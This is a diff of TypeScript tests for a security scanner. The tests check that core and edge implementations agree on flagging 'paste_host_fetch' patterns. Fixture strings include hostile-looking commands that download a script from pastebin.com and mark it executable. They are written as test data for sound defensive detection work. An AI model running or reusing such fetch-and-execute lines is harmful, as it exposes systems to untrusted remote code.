@@ -298,3 +298,101 @@ describe('core <-> edge behavioral fixture parity — paste_host_fetch (SMI-6033
     expect(edgePasteHostFinding, 'edge must not find paste_host_fetch').toBeUndefined()
   })
 })
+
+// SMI-6033 Wave 3 (adversarial-review fix): the same-line fetch-target gate
+// used to be a bare FETCH_COMMAND_PATTERN test against the whole LINE, so a
+// fetch verb ANYWHERE on the line bound an unrelated paste-host URL to it.
+// Both surfaces carry the identical isActualFetchTarget token-binding fix.
+describe('core <-> edge same-line fetch-target binding parity (SMI-6033 Wave 3)', () => {
+  const phf = (findings: Array<{ type: string }>) =>
+    findings.filter((f) => f.type === 'paste_host_fetch')
+
+  it('FP: a paste-host URL merely mentioned after an unrelated fetch on the same line produces no finding on core or edge', async () => {
+    const coreMod = await import(CORE_SCANNER)
+    const edgeMod = await import(NODE_SCANNER)
+    const scanner = new coreMod.SecurityScanner()
+    const content = [
+      'curl -o setup.sh https://example.com/setup.sh; see the mirror at https://pastebin.com/abc123',
+      'chmod +x setup.sh',
+    ].join('\n')
+
+    const coreReport = scanner.scan('parity', content)
+    const edgeRes = await edgeMod.scanSkillContent(content)
+
+    expect(
+      phf(coreReport.findings),
+      'core must not bind an unrelated URL to the fetch'
+    ).toHaveLength(0)
+    expect(phf(edgeRes.findings), 'edge must match core').toHaveLength(0)
+  })
+
+  it('FP: a transfer-host URL mentioned after an unrelated `curl --version` produces no finding on core or edge', async () => {
+    const coreMod = await import(CORE_SCANNER)
+    const edgeMod = await import(NODE_SCANNER)
+    const scanner = new coreMod.SecurityScanner()
+    const content = 'curl --version; the reproducer mirror lives at https://transfer.sh/abc123'
+
+    const coreReport = scanner.scan('parity', content)
+    const edgeRes = await edgeMod.scanSkillContent(content)
+
+    expect(phf(coreReport.findings), 'core must not fire the transient tier').toHaveLength(0)
+    expect(phf(edgeRes.findings), 'edge must match core').toHaveLength(0)
+  })
+
+  it('TP control: the same paste-host URL as the ACTUAL curl argument still fires critical on core and edge', async () => {
+    const coreMod = await import(CORE_SCANNER)
+    const edgeMod = await import(NODE_SCANNER)
+    const scanner = new coreMod.SecurityScanner()
+    const content = ['curl -o setup.sh https://pastebin.com/abc123', 'chmod +x setup.sh'].join('\n')
+
+    const coreFinding = phf(scanner.scan('parity', content).findings)[0] as
+      | { severity: string }
+      | undefined
+    const edgeRes = await edgeMod.scanSkillContent(content)
+    const edgeFinding = phf(edgeRes.findings)[0] as { severity: string } | undefined
+
+    expect(coreFinding?.severity, 'core severity').toBe('critical')
+    expect(edgeFinding?.severity, 'edge severity must match core').toBe(coreFinding?.severity)
+  })
+
+  // SMI-6033 Wave 3: the shared fetch-correlation utility is directory-aware,
+  // so this detector's "fetch destination executed elsewhere" evidence no
+  // longer accepts a coincidental basename collision.
+  it('FP: a same-named exec target in a DIFFERENT directory is not execution evidence, on core or edge', async () => {
+    const coreMod = await import(CORE_SCANNER)
+    const edgeMod = await import(NODE_SCANNER)
+    const scanner = new coreMod.SecurityScanner()
+    const content = [
+      'curl -o /tmp/installer.sh https://pastebin.com/raw/foo',
+      'chmod +x ./vendor/other-tool/installer.sh',
+    ].join('\n')
+
+    const coreReport = scanner.scan('parity', content)
+    const edgeRes = await edgeMod.scanSkillContent(content)
+
+    expect(
+      phf(coreReport.findings),
+      'core must not treat a basename collision as evidence'
+    ).toHaveLength(0)
+    expect(phf(edgeRes.findings), 'edge must match core').toHaveLength(0)
+  })
+
+  it('TP control: the SAME directory on both sides is execution evidence (critical) on core and edge', async () => {
+    const coreMod = await import(CORE_SCANNER)
+    const edgeMod = await import(NODE_SCANNER)
+    const scanner = new coreMod.SecurityScanner()
+    const content = [
+      'curl -o /tmp/installer.sh https://pastebin.com/raw/foo',
+      'chmod +x /tmp/installer.sh',
+    ].join('\n')
+
+    const coreFinding = phf(scanner.scan('parity', content).findings)[0] as
+      | { severity: string }
+      | undefined
+    const edgeRes = await edgeMod.scanSkillContent(content)
+    const edgeFinding = phf(edgeRes.findings)[0] as { severity: string } | undefined
+
+    expect(coreFinding?.severity, 'core severity').toBe('critical')
+    expect(edgeFinding?.severity, 'edge severity must match core').toBe(coreFinding?.severity)
+  })
+})
